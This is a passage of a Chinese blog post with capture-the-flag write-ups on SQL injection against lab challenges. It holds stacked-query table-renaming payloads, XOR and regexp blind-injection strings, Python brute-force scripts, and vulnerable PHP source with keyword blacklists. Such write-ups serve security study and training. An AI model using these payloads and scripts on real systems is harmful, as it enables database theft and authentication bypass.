显示如下</code></pre><p><strong>注意：字符串为表名操作时要加反引号！！！</strong></p><p>由展示的结果发现输入查询的结果是一个数字和一个字符串，是表words中的id和data结构，服务器是把inject的数值赋给id来查询表words中的数据</p><p>这题没有禁用rename和alter</p><p>可采用修改表结构的方法来得到flag，将words表名改为words1，再将数字名表改为words，这样数字名表就是默认查询的表了，但是它少了一个id列，可以将flag字段改为id，或者添加id字段</p><blockquote><p>rename用来修改表名</p><p>用法rename命令格式：rename table 原表名 to 新表名;</p></blockquote><blockquote><p>alter用来删除，添加或修改表字段</p><p>常用的语法格式如下：ALTER TABLE &lt;表名&gt; [修改选项]</p></blockquote><pre class="language-mysql" data-language="mysql"><code class="language-mysql">1&#39;;rename table &#96;words&#96; to &#96;words1&#96;;rename table &#96;1919810931114514&#96; to &#96;words&#96;; alter table &#96;words&#96; change &#96;flag&#96; &#96;id&#96; varchar(100);#</code></pre><p>上段注入语句的意思是将表words的名字修改为words1，把包含flag表1919810931114514的名字改成words，这样就可以通过服务器查询表1919810931114514中的内容了，但是flag表中含有少一个id列，于是可以在表中添加一个后者将flag列改为id，上面用到的是改flag列名字为id的方法,下面给出添加id列的方法：</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">1&#39;;rename table &#96;words&#96; to &#96;words1&#96;;rename table &#96;1919810931114514&#96; to &#96;words&#96;; alter table &#96;words&#96; add &#96;id&#96; varchar(100);#</code></pre><p>最终得到flag：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/UoGTZ8HB9c7KlQ3.png" alt loading="lazy"></p><h2 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h2><h3 id="2020ichunqiu新春公益赛—Ezsqli"><a href="#2020ichunqiu新春公益赛—Ezsqli" class="headerlink" title="2020ichunqiu新春公益赛—Ezsqli"></a>2020ichunqiu新春公益赛—Ezsqli</h3><p>出题思路<a href="https://www.smi1e.top/%E6%96%B0%E6%98%A5%E6%88%98%E7%96%AB%E5%85%AC%E7%9B%8A%E8%B5%9B-ezsqli-%E5%87%BA%E9%A2%98%E5%B0%8F%E8%AE%B0/">Smi1e</a></p><p>界面：</p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL注入/tQegj4JmCsGbTXp.png" style="zoom:50%;" loading="lazy"><p>FUZZ测试后发现</p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL注入/7UIS3oMv6DWqsj8.png" style="zoom:80%;" loading="lazy"><p><code>in</code>被过滤<code>information_schema</code>、<code>mysql.innodb_table_stats</code>、<code>sys.schema_auto_increment_columns</code>都用不了了，这时就需要新的表来代替，<a href="https://osandamalith.com/2020/01/27/alternatives-to-extract-tables-and-columns-from-mysql-and-mariadb/">参考</a></p><p>Payload1：<code>1^((select substr((select group_concat(table_name) from sys.x$schema_flattened_keys),1,1))=&#39;f&#39;)</code></p><p>Payload2：<code>1^((select substr((select group_concat(table_name) from sys.x$schema_table_statistics_with_buffer where table_schema=database()),1,1))=&#39;f&#39;)</code></p><p>于是写出盲注爆表脚本（Payload1）</p><pre class="language-python" data-language="python"><code class="language-python">import requestsurl &#x3D; &quot;http:&#x2F;&#x2F;586656b32259484e8dbc25a81ee0a407820801130961430a.changame.ichunqiu.com&#x2F;index.php&quot;for i in range(1,100):    for j in range(40,128):        #d &#x3D; &quot;1 and if(ascii(mid(fl4g,1,1))regexp &quot;+str(j)+&quot;,sleep(3),1)&quot;        d &#x3D; &quot;1^(ascii(substr((select group_concat(table_name,&#39;&#39;) from sys.x$schema_flattened_keys),&#123;&#125;,1))&#x3D;&#123;&#125;)&quot;.format(i,j)        data &#x3D; &#123;&quot;id&quot;:d&#125;        r &#x3D; requests.post(url,data &#x3D; data)        if &#39;Nu1L&#39; not in r.text:            print(chr(j),end&#x3D;&#39;&#39;)            break</code></pre><p>得到两个表名，<code>f1ag_1s_h3r3_hhhhh</code>、<code>users233333333333333</code></p><p><code>flag</code>应该在<code>f1ag_1s_h3r3_hhhhh</code>中，这里需要用到一个技巧，就是将查询语句与相同数量的列进行比较，<a href="https://nosec.org/home/detail/3830.html">参考</a>，如图</p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL注入/sFLidjDgr5weSft.png" style="zoom: 80%;" loading="lazy"><p>而在mysql中，比较字符串大小是按位比较的，所以就可以用比较大小的方法一个一个的得到字段的内容</p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL注入/JIK9gluR1khN6zr.png" style="zoom:80%;" loading="lazy"><p>注：出题人这里还有一个坑，详见题目下方的链接</p><p>mysql默认是不区分大小写的区分大小写的注入，所以在爆字段的时候需要注意，但由于比赛flag都是小写，所以就直接盲注就可以了，但这里还是给出区分大小写的方法，<code>BINARY(&quot;A&quot;)</code>、<code>CAST(&quot;A&quot; AS JSON)</code>都会返回大写的A，当<code>in</code>被过滤了<code>BINARY</code>就不好使了，所以用第二个就OK</p><p>这里可以测试出有两个列，但是盲猜第一列的第一个是1可还行</p><p>Payload：<code>1^((select 1,concat(&#39;&#123;&#125;~&#39;,CAST(&#39;0&#39; AS JSON)))&lt;(select * from f1ag_1s_h3r3_hhhhh limit 1))</code></p><p>于是写出盲注爆字段脚本</p><pre class="language-python" data-language="python"><code class="language-python">import requestsimport stringurl &#x3D; &quot;http:&#x2F;&#x2F;a9362c1023c04da19c143e01d7991148619db7d8fbff4e43.changame.ichunqiu.com&#x2F;index.php&quot;str &#x3D; (&quot;-&quot; + string.digits + string.ascii_letters + string.punctuation).replace(&quot;&#39;&quot;,&quot;&quot;).replace(&#39;&quot;&#39;,&#39;&#39;).replace(&quot;\\&quot;,&quot;&quot;)flag &#x3D; &quot;&quot;for i in range(1,100):    for j in str:        #d &#x3D; &quot;1 and if(ascii(mid(fl4g,1,1))regexp &quot;+str(j)+&quot;,sleep(3),1)&quot;        d &#x3D; &quot;1^((select 1,concat(&#39;&#123;&#125;~&#39;,CAST(&#39;0&#39; AS JSON)))&lt;(select * from f1ag_1s_h3r3_hhhhh limit 1))&quot;.format(flag+j)        data &#x3D; &#123;&quot;id&quot;:d&#125;        r &#x3D; requests.post(url,data &#x3D; data)        if &#39;Nu1L&#39; in r.text:            print(j,end&#x3D;&#39;&#39;)            break    flag &#x3D; flag + j</code></pre><p>最终可以得到flag</p><h3 id="2020ichunqiu新春公益赛—简单的招聘系统"><a href="#2020ichunqiu新春公益赛—简单的招聘系统" class="headerlink" title="2020ichunqiu新春公益赛—简单的招聘系统"></a>2020ichunqiu新春公益赛—简单的招聘系统</h3><p>首先有个登录界面</p><p>尝试使用弱密码，<code>1&#39; or 1=1#</code></p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/tuM3g2DS8hEQ1WL.png" alt loading="lazy"></p><p>于是可以在登录界面进行布尔盲注</p><p>爆库Payload：<code>2&#39; or (select (mid((select database()),&#123;&#125;,1)))=&#39;&#123;&#125;&#39;#</code></p><p>爆表Payload：<code>2&#39; or (select (mid((select group_concat(table_name,&#39;&#39;) from information_schema.tables where table_schema=database()),&#123;&#125;,1)))=&#39;&#123;&#125;&#39;#</code></p><p>爆列Payload：<code>2&#39; or (select (mid((select group_concat(column_name,&#39;&#39;) from information_schema.columns where table_name=&#39;flag&#39;),&#123;&#125;,1)))=&#39;&#123;&#125;&#39;#</code></p><p>爆字段Payload：<code>2&#39; or (select (mid((select group_concat(flaaag,&#39;&#39;) from flag),&#123;&#125;,1)))=&#39;&#123;&#125;&#39;#</code></p><pre class="language-python" data-language="python"><code class="language-python">import requestsimport stringurl &#x3D; &quot;http:&#x2F;&#x2F;b191000b2d4c4a77ad9c86f2d5476e7172ed2000f40b4c72.changame.ichunqiu.com&#x2F;&quot;str &#x3D; (&quot;-&quot; + string.digits + string.ascii_letters + string.punctuation).replace(&quot;&#39;&quot;,&quot;&quot;).replace(&#39;&quot;&#39;,&#39;&#39;).replace(&quot;\\&quot;,&quot;&quot;)flag &#x3D; &quot;&quot;for i in range(1,100):    for j in str:        #d &#x3D; &quot;1 and if(ascii(mid(fl4g,1,1))regexp &quot;+str(j)+&quot;,sleep(3),1)&quot;        d &#x3D; &quot;(This is Payload)&quot;.format(i,j)        #print(d)        data &#x3D; &#123;&quot;lname&quot;:d , &quot;lpass&quot;:&#39;xxx&#39;&#125;        r &#x3D; requests.post(url,data &#x3D; data)        r.encoding &#x3D; &#39;gbk&#39;        if &#39;成功&#39; in r.text.encode(&#39;gbk&#39;).decode(r.apparent_encoding):            print(j,end&#x3D;&#39;&#39;)            break</code></pre><p>得到数据库：<code>nzhaopin</code>,表：<code>backup,flag,user</code>，flag表的内容：<code>id,flaaag</code>，最终得到flag</p><h3 id="CISCN2019-Web1—Hack-World"><a href="#CISCN2019-Web1—Hack-World" class="headerlink" title="CISCN2019-Web1—Hack World"></a>CISCN2019-Web1—Hack World</h3><p><strong>解题核心</strong>—————–异或注入，盲注爆破</p><p>界面：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/t2nS8YpRmGTEsx7.png" alt loading="lazy"></p><p>题目给出了flag在flag表和flag列中</p><p>测试后发现过滤了大多数字符，但有些还是没过滤的，于是进行sql盲注</p><p>空格利用<code>()</code>绕过，配合异或注入和判断回显信息一个一个爆出字符串</p><p>python脚本：</p><pre class="language-python" data-language="python"><code class="language-python">import requestsurl &#x3D; &quot;http:&#x2F;&#x2F;13b50f67-3a54-481d-ae76-97f425fd8855.node3.buuoj.cn&#x2F;&quot;for i in range(1,100):    for j in range(1,128):        d &#x3D; &quot;1^(ascii(substr((select(flag)from(flag)),&#123;&#125;,1))&#x3D;&#123;&#125;)&quot;.format(i,j)        data &#x3D; &#123;&quot;id&quot;:d&#125;        r &#x3D; requests.post(url,data &#x3D; data)        print(r.status_code)        if &#39;Error&#39; in r.text:            print(chr(j),end&#x3D;&#39;&#39;)</code></pre><p>网上这题的源码，可以参考参考</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?php$dbuser&#x3D;&#39;root&#39;;$dbpass&#x3D;&#39;root&#39;;function safe($sql)&#123;    #被过滤的内容 函数基本没过滤    $blackList &#x3D; array(&#39; &#39;,&#39;||&#39;,&#39;#&#39;,&#39;-&#39;,&#39;;&#39;,&#39;&amp;&#39;,&#39;+&#39;,&#39;or&#39;,&#39;and&#39;,&#39;&#96;&#39;,&#39;&quot;&#39;,&#39;insert&#39;,&#39;group&#39;,&#39;limit&#39;,&#39;update&#39;,&#39;delete&#39;,&#39;*&#39;,&#39;into&#39;,&#39;union&#39;,&#39;load_file&#39;,&#39;outfile&#39;,&#39;.&#x2F;&#39;);    foreach($blackList as $blackitem)&#123;        if(stripos($sql,$blackitem))&#123;            return False;        &#125;    &#125;    return True;&#125;if(isset($_POST[&#39;id&#39;]))&#123;    $id &#x3D; $_POST[&#39;id&#39;];&#125;else&#123;    die();&#125;$db &#x3D; mysql_connect(&quot;localhost&quot;,$dbuser,$dbpass);if(!$db)&#123;    die(mysql_error());&#125;   mysql_select_db(&quot;ctf&quot;,$db);if(safe($id))&#123;    $query &#x3D; mysql_query(&quot;SELECT content from passage WHERE id &#x3D; $&#123;id&#125; limit 0,1&quot;);    if($query)&#123;        $result &#x3D; mysql_fetch_array($query);        if($result)&#123;            echo $result[&#39;content&#39;];        &#125;else&#123;            echo &quot;Error Occured When Fetch Result.&quot;;        &#125;    &#125;else&#123;        var_dump($query);    &#125;&#125;else&#123;    die(&quot;SQL Injection Checked.&quot;);&#125;</code></pre><h3 id="极客大挑战—FinalSQL"><a href="#极客大挑战—FinalSQL" class="headerlink" title="极客大挑战—FinalSQL"></a>极客大挑战—FinalSQL</h3><p><strong>解题核心</strong>—————–异或注入，盲注爆破</p><p>在用户名和密码密码处尝试注入，发现绝大多数的字符都被过滤，于是找到另一个注入点（如下图），把注释删掉后在界面传参回车后观察URL的变化，传了一个id参数，故尝试在URL中的id处注入</p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL注入/MK1eADvmQB6dsRu.png" style="zoom: 80%;" loading="lazy"><p>后台过滤到限制字符的显示的界面（如下图）</p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL注入/R4IgVByGQD1h6Pk.png" style="zoom:33%;" loading="lazy"><p>当注入上一题的查询数据库语句时，发现可以注入，显示以下界面，应该是后台把报错的界面给处理了，所以看不到数据库报错的界面</p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL注入/yjbmJD4Ocn76fCA.png" style="zoom:33%;" loading="lazy"><p>进行异或注入测试，通过测试发现，id=1^1的结果和id=0的结果是一样的，当id=1^0的时候，界面就返回了当id=1的时候的界面，由此可以想到通过构造ASCII函数配合substr函数判断字符大小，当ASCII函数值等于（居然没过滤）后面的十进制时，显示id=0的时候的界面，具体脚本和判断方法如下：</p><pre class="language-sql" data-language="sql"><code class="language-sql">1^(ascii(substr((&quot;此处为sql语句&quot;),变量i,1))&#x3D;变量j)</code></pre><p>查库：</p><pre class="language-python" data-language="python"><code class="language-python">import requestsurl &#x3D; &quot;http:&#x2F;&#x2F;8a4e2d60-6624-4865-b943-aa15ea964e76.node3.buuoj.cn&#x2F;search.php&quot;for i in range(1,20):    for j in range(1,128):        d &#x3D; &quot;?id&#x3D;1^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where((table_schema)like&#39;geek&#39;)),&#39;&quot;+str(i)+&quot;&#39;,1))&#x3D;&#39;&quot;+str(j)+&quot;&#39;)&quot;        r &#x3D; requests.get(url+d)        if &#39;ERROR&#39; in r.text:            print(chr(j),end&#x3D;&#39;&#39;)</code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/31rlIa5vfeoYkNF.png" alt loading="lazy"></p><p>查表：</p><pre class="language-python" data-language="python"><code class="language-python">import requestsurl &#x3D; &quot;http:&#x2F;&#x2F;8a4e2d60-6624-4865-b943-aa15ea964e76.node3.buuoj.cn&#x2F;search.php&quot;for i in range(1,20):    for j in range(1,128):        d &#x3D; &quot;?id&#x3D;1^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where((table_schema)&#x3D;&#39;geek&#39;)),&#39;&quot;+str(i)+&quot;&#39;,1))&#x3D;&#39;&quot;+str(j)+&quot;&#39;)&quot;        r &#x3D; requests.get(url+d)        if &#39;ERROR&#39; in r.text:            print(chr(j),end&#x3D;&#39;&#39;)</code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/iOdeEnDWUwNK8V3.png" alt loading="lazy"></p><p>查列：</p><pre class="language-python" data-language="python"><code class="language-python">import requestsurl &#x3D; &quot;http:&#x2F;&#x2F;8a4e2d60-6624-4865-b943-aa15ea964e76.node3.buuoj.cn&#x2F;search.php&quot;for i in range(1,20):    for j in range(1,128):        d &#x3D; &quot;?id&#x3D;1^(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where((table_name)&#x3D;&#39;F1naI1y&#39;)),&#39;&quot;+str(i)+&quot;&#39;,1))&#x3D;&#39;&quot;+str(j)+&quot;&#39;)&quot;        r &#x3D; requests.get(url+d)        if &#39;ERROR&#39; in r.text:            print(chr(j),end&#x3D;&#39;&#39;)</code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/DTSb4nMyjg6e89R.png" alt loading="lazy"></p><p>emmmmmmm这里长度没给够，根据前面的经验，查password列应该就可以了，F1aaaaag表中没有东西</p><p>查字段：</p><pre class="language-python" data-language="python"><code class="language-python">import requestsurl &#x3D; &quot;http:&#x2F;&#x2F;8a4e2d60-6624-4865-b943-aa15ea964e76.node3.buuoj.cn&#x2F;search.php&quot;for i in range(1,300):    for j in range(1,128):        d &#x3D; &quot;?id&#x3D;1^(ascii(substr((select(group_concat(password))from(F1naI1y)),&#39;&quot;+str(i)+&quot;&#39;,1))&#x3D;&#39;&quot;+str(j)+&quot;&#39;)&quot;        r &#x3D; requests.get(url+d)        if &#39;ERROR&#39; in r.text:            print(chr(j),end&#x3D;&#39;&#39;)</code></pre><p>拿到flag：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/RvGOsyKqSXYNEug.png" alt loading="lazy"></p><h3 id="BJDCTF-2nd—简单注入"><a href="#BJDCTF-2nd—简单注入" class="headerlink" title="BJDCTF-2nd—简单注入"></a>BJDCTF-2nd—简单注入</h3><p><strong>解题核心</strong>—————–regexp()正则匹配，binary大小写匹配，布尔盲注(亦可时间盲注)</p><p>参考：<a href="https://www.gem-love.com/ctf/2097.html#GirlfriendInjection">https://www.gem-love.com/ctf/2097.html#GirlfriendInjection</a></p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL注入/rODhM3lG8ux9Hdf.png" style="zoom:80%;" loading="lazy"><p>这题看着界面有点眼熟，这这个网站上有个类似的题<a href="http://pcat.cc/q.php">http://pcat.cc/q.php</a> ，Question 5那一期的web题</p><p>先fuzz一下，以下字符被过滤：</p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL注入/FnfpO9AMlex8UdC.png" style="zoom: 80%;" loading="lazy"><p>几个常用的注入参数被过滤：<code>&#39; &quot; select</code>，这几个参数被过滤就已经杀了大部分的可注入方式，于是想办法构造注入条件，题目解题思路和Question 5那一期的web题类似，直接给出解题方法</p><p>解题方法：在用户名处注入反斜杆<code>\</code>，可以将后端<code>sql</code>语句处<code>username</code>的后面的单引号转义</p><p>推测后端sql语句变成</p><pre class="language-sql" data-language="sql"><code class="language-sql">select username password from users where username &#x3D; &#39;1\&#39; and password &#x3D; &#39; or 1#&#39;</code></pre><p>测试后发题目下方的字符串改变了（可惜比赛的时候没注意），可以用regexp正则模糊匹配的方法构造sql注入语句注出<code>admin</code>的<code>password</code>，于是写<code>python</code>脚本盲注</p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL注入/Vc2DsFmxGRngN4p.png" style="zoom: 80%;" loading="lazy"><pre class="language-python" data-language="python"><code class="language-python">import requestsurl &#x3D; &quot;http:&#x2F;&#x2F;507fd7ed-7cc8-42d3-86ad-6b5ec032b815.node3.buuoj.cn&#x2F;index.php&quot;header &#x3D; &#123;    &quot;User-Agent&quot;: &quot;Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko&#x2F;20100101 Firefox&#x2F;74.0&quot;,    &quot;Accept&quot;: &quot;text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,*&#x2F;*;q&#x3D;0.8&quot;,    &quot;Content-Type&quot;: &quot;application&#x2F;x-www-form-urlencoded&quot;&#125;str1 &#x3D; &#39;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789&#39;passwd &#x3D; &#39;&#39;pass1 &#x3D; &#39;&#39;for i in range(100):    for j in str1:        pass1 &#x3D; &#39;0x5E&#39; + passwd.replace(&#39;0x5E&#39;,&#39;&#39;) + hex(ord(j)).replace(&#39;0x&#39;,&#39;&#39;)        payload &#x3D; &#39; or password regexp binary &#123;&#125;#&#39;.format(pass1)        #print(pass1)        data &#x3D; &#123;            &#39;username&#39;: &#39;1\\&#39;,            &#39;password&#39;: payload        &#125;        r &#x3D; requests.post(url,data&#x3D;data,headers&#x3D;header)        if &#39;BJD needs&#39; in r.text:            passwd &#x3D; passwd + hex(ord(j)).replace(&#39;0x&#39;,&#39;&#39;)            print(j,end&#x3D;&#39;&#39;)            break</code></pre><p>注意这里<code>binary</code>的使用，比赛的时候就是被这里给坑了=.=，mysql默认不区分大小写，这里使用该关键字来区分大小写，还有<code>regexp</code>函数可以匹配十六进制数，涨姿势了，这样就可以绕过引号的过滤，另外上面的<code>Ezsqli</code>题也还有一种匹配大小写的方法，用于<code>in</code>被过滤，<code>binary</code>就不好使了</p><p>最后盲注出<code>password</code>为<code>OhyOuFOuNdit</code>登录<code>admin</code>账号即可得到<code>flag</code></p><p>另外还有一种时间盲注的方法： <code>or if(substr(password,1,1)regexp binary 0x5E...,sleep(3),1)</code></p><h3 id="CTFshow—web1"><a href="#CTFshow—web1" class="headerlink" title="CTFshow—web1"></a>CTFshow—web1</h3><p>访问<code>www.zip</code>得到源码</p><p>index.php（略）</p><p>login.php</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?php        error_reporting(0);        session_start();        $con &#x3D; mysqli_connect(&quot;localhost&quot;,&quot;root&quot;,&quot;root&quot;,&quot;web15&quot;);        if (!$con)        &#123;            die(&#39;Could not connect: &#39; . mysqli_error());        &#125;        $username&#x3D;$_POST[&#39;username&#39;];        $password&#x3D;$_POST[&#39;password&#39;];        if(isset($username) &amp;&amp; isset($password))&#123;            if(preg_match(&quot;&#x2F;group|union|select|from|or|and|regexp|substr|like|create|drop|\,|\&#96;|\!|\@|\#|\%|\^|\&amp;|\*|\(|\)|\（|\）|\_|\+|\&#x3D;|\]|\;|\&#39;|\’|\“|\&quot;|\&lt;|\&gt;|\?&#x2F;i&quot;,$username))&#123;                die(&quot;error&quot;);            &#125;            $sql&#x3D;&quot;select pwd from user where uname &#x3D; &#39;$username&#39; limit 1&quot;;            $res&#x3D;mysqli_query($con,$sql);            $row &#x3D; mysqli_fetch_array($res);            if($row[&#39;pwd&#39;]&#x3D;&#x3D;&#x3D;$password)&#123;                $_SESSION[&quot;login&quot;] &#x3D; true;                header(&quot;location:&#x2F;user_main.php?order&#x3D;id&quot;);            &#125;else&#123;                header(&quot;location:&#x2F;index.php&quot;);            &#125;        &#125;else&#123;            header(&quot;location:&#x2F;index.php&quot;);        &#125;?&gt;</code></pre><p>reg.html（略）</p><p>reg.php</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?php        error_reporting(0);        $con &#x3D; mysqli_connect(&quot;localhost&quot;,&quot;root&quot;,&quot;root&quot;,&quot;web15&quot;);        if (!$con)        &#123;            die(&#39;Could not connect: &#39; . mysqli_error());        &#125;        $username&#x3D;$_POST[&#39;username&#39;];        $password&#x3D;$_POST[&#39;password&#39;];        $email&#x3D;$_POST[&#39;email&#39;];        $nickname&#x3D;$_POST[&#39;nickname&#39;];        if(preg_match(&quot;&#x2F;group|union|select|from|or|and|regexp|substr|like|create|drop|\&#96;|\!|\@|\#|\%|\^|\&amp;|\*|\(|\)|\（|\）|\_|\+|\&#x3D;|\]|\;|\&#39;|\’|\“|\&quot;|\&lt;|\&gt;|\?&#x2F;i&quot;,$username))&#123;                die(&quot;error&quot;);        &#125;        if(preg_match(&quot;&#x2F;group|union|select|from|or|and|regexp|substr|like|create|drop|\&#96;|\!|\@|\#|\%|\^|\&amp;|\*|\(|\)|\（|\）|\_|\+|\&#x3D;|\]|\;|\&#39;|\’|\“|\&quot;|\&lt;|\&gt;|\?&#x2F;i&quot;,$password))&#123;                die(&quot;error&quot;);        &#125;        if(preg_match(&quot;&#x2F;group|union|select|from|or|and|regexp|substr|like|create|drop|\&#96;|\!|\#|\%|\^|\&amp;|\*|\(|\)|\（|\）|\-|\_|\+|\&#x3D;|\&#123;|\&#125;\]|\&#39;|\’|\“|\&quot;|\&lt;|\&gt;|\?&#x2F;i&quot;,$email))&#123;                die(&quot;error&quot;);        &#125;        if(preg_match(&quot;&#x2F;group|union|select|from|or|and|regexp|substr|like|create|drop|\&#96;|\~|\!|\@|\#|\%|\^|\&amp;|\*|\(|\)|\（|\）|\-|\_|\+|\&#x3D;|\&#123;|\&#125;|\]|\;|\&#39;|\’|\“|\&quot;|\&lt;|\&gt;|\?&#x2F;i&quot;,$nickname))&#123;                die(&quot;error&quot;);        &#125;        if(isset($username) &amp;&amp; isset($password) &amp;&amp; isset($email) &amp;&amp; isset($nickname))&#123;            $sql &#x3D; &quot;INSERT INTO user (uname, pwd, email,nname) VALUES (&#39;$username&#39;, &#39;$password&#39;, &#39;$email&#39;,&#39;$nickname&#39;)&quot;;            $res&#x3D;mysqli_query($con, $sql);            if ($res) &#123;                $_SESSION[&quot;login&quot;] &#x3D; true;                header(&quot;location:&#x2F;index.php&quot;);            &#125;         &#125;        mysqli_close($conn);?&gt;</code></pre><p>user_main.php</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?phperror_reporting(0);session_start();?&gt;&lt;!doctype html&gt;&lt;html&gt;&lt;head&gt;&lt;meta charset&#x3D;&quot;utf-8&quot;&gt;&lt;title&gt;CTFshow_web&lt;&#x2F;title&gt;&lt;style&gt;..........(css)&lt;&#x2F;style&gt;&lt;&#x2F;head&gt;&lt;body&gt;&lt;?php    if(isset($_SESSION[&quot;login&quot;]) &amp;&amp; $_SESSION[&quot;login&quot;] &#x3D;&#x3D;&#x3D; true)&#123;        $con &#x3D; mysqli_connect(&quot;localhost&quot;,&quot;root&quot;,&quot;root&quot;,&quot;web15&quot;);        if (!$con)        &#123;            die(&#39;Could not connect: &#39; . mysqli_error());        &#125;        $order&#x3D;$_GET[&#39;order&#39;];        if(isset($order) &amp;&amp; strlen($order)&lt;6)&#123;            if(preg_match(&quot;&#x2F;group|union|select|from|or|and|regexp|substr|like|create|drop|\,|\&#96;|\~|\!|\@|\#|\%|\^|\&amp;|\*|\(|\)|\（|\）|\-|\_|\+|\&#x3D;|\&#123;|\&#125;|\[|\]|\;|\:|\&#39;|\’|\“|\&quot;|\&lt;|\&gt;|\?|\,|\.|\?&#x2F;i&quot;,$order))&#123;                die(&quot;error&quot;);            &#125;            $sql&#x3D;&quot;select * from user order by $order&quot;;        &#125;else&#123;            $sql&#x3D;&quot;select * from user order by id&quot;;        &#125;   ?&gt;..........(html)&lt;&#x2F;body&gt;&lt;&#x2F;html&gt;</code></pre><p>可以看到可传入的值都经过了严格的过滤，大多数特殊符号都被过滤，所以直接进行sql注入显然不可能，寻找其他的入手点，可以看到在<code>user_main.php</code>的传入的<code>order</code>值处，有一条<code>order by</code>语句，是用来根据<code>order by</code>后面的列来进行排序的，根据题目提示<code>flag_is_my_password</code>，所以我们只需要得到用户<code>flag</code>的密码即可，于是我们可以根据<code>pwd</code>的值来排序，然后配合盲注得出<code>flag</code>，我们注册不同密码的账号，原理假设密码为<code>e</code>（前端有个<code>md5</code>加密抓包可以直接绕过不影响），如果<code>flag</code>的密码为<code>flag&#123;xxxxx&#125;</code>那么<code>e</code>&lt;<code>flag&#123;xxxxx&#125;</code>，再传入<code>user_main.php?order=pwd</code>，那么密码为<code>e</code>的这一行就在flag这一行的上面。而如果注册一个密码为<code>g</code>的用户，则密码为<code>g</code>的用户的这一行则会在<code>flag</code>这一行的下面，于是就可以拿来进行盲注比较得出<code>flag</code>的所有值</p><p>exp</p><pre class="language-python" data-language="python"><code class="language-python">import requestsurl &#x3D; &quot;https:&#x2F;&#x2F;b51823a7-b1c0-499d-878a-8a5b296655d3.chall.ctf.show&quot;urlreg &#x3D; url + &quot;&#x2F;reg.php&quot;  #注册 必须要是可传参php文件urllogin &#x3D; url + &quot;&#x2F;login.php&quot;  #登录 必须要是可传参php文件urlorder &#x3D; url + &quot;&#x2F;user_main.php?order&#x3D;pwd&quot;  # 显示s &#x3D; &quot;-.0123456789:abcdefghijklmnopqrstuvwxyz&#123;|&#125;~&quot;  # 按照ascii码表的字符串大小排序flag &#x3D; &quot;&quot;for i in range(100):    for j in s:        exp &#x3D; &quot;&quot;        exp &#x3D; flag + j        datereg &#x3D; &#123;            &quot;username&quot;:exp,  # 仔细观察username和password并没有对-和&#123;&#125;进行过滤            &quot;email&quot;:&quot;zzz&quot;,            &quot;nickname&quot;:&quot;zzz&quot;,            &quot;password&quot;:exp        &#125;        datelogin &#x3D; &#123;            &quot;username&quot;:exp,            &quot;password&quot;:exp        &#125;        if (exp &#x3D;&#x3D; &#39;flag&#39;):  # 当注册的用户名字为flag的时候，因为已经存在flag用户在，额直接打印flag跳过后面的语句的执行            flag &#x3D; &#39;flag&#39;            print(flag)            break        session &#x3D; requests.session()  # 保持会话        reg &#x3D; session.post(urlreg, datereg)        login &#x3D; session.post(urllogin, datelogin)        a &#x3D; session.get(urlorder)        txt &#x3D; a.text        if (txt.index(&quot;&lt;td&gt;&quot;+exp+&quot;&lt;&#x2F;td&gt;&quot;)&gt;txt.index(&quot;&lt;td&gt;flag@ctf.show&lt;&#x2F;td&gt;&quot;)):  # index返回字符串被找到到最小的索引（最左）            flag &#x3D; flag + chr(ord(j)-1)   # 得到的字符为比flag的单个字符的值大1，所以需要-1            print(flag)            break</code></pre><p>最终得到到flag</p><h3 id="CISCN2019-总决赛-Day2-Web1-Easyweb"><a href="#CISCN2019-总决赛-Day2-Web1-Easyweb" class="headerlink" title="CISCN2019-总决赛-Day2-Web1-Easyweb"></a>CISCN2019-总决赛-Day2-Web1-Easyweb</h3><p>robots.txt内容如下</p><pre class="language-none"><code class="language-none">User-agent: *Disallow: *.php.bak</code></pre><p>于是找<code>.bak</code>文件，发现存在image.php.bak，下载下来后得到image.php的源码如下:</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?phpinclude &quot;config.php&quot;;$id&#x3D;isset($_GET[&quot;id&quot;])?$_GET[&quot;id&quot;]:&quot;1&quot;;$path&#x3D;isset($_GET[&quot;path&quot;])?$_GET[&quot;path&quot;]:&quot;&quot;;$id&#x3D;addslashes($id);$path&#x3D;addslashes($path);$id&#x3D;str_replace(array(&quot;\\0&quot;,&quot;%00&quot;,&quot;\\&#39;&quot;,&quot;&#39;&quot;),&quot;&quot;,$id);$path&#x3D;str_replace(array(&quot;\\0&quot;,&quot;%00&quot;,&quot;\\&#39;&quot;,&quot;&#39;&quot;),&quot;&quot;,$path);$result&#x3D;mysqli_query($con,&quot;select * from images where id&#x3D;&#39;&#123;$id&#125;&#39; or 